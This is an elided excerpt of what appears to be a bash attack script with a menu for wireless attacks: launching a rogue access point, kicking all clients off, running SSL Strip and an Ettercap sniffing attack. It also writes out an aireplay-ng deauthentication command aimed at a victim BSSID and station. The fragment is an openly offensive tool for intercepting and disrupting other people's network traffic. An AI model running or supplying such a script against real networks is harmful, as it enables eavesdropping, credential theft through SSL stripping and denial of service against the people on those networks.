...
menu()
{
    ...
    | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT}) Launch Access Point                              |
    | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT}) Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Required after option 4)${TXT_RST}${BLD_WHT} |
    | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT}) Kick everyone                                    |
    | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT}) Start SSL Strip                                  |
    | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT}) Start Ettercap Sniff Attack                      |
    ...
    if [[ $choice == 1 ]]; then
        ...
        sudo aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION wlan0mon
    elif [[ $choice == 7 ]]; then
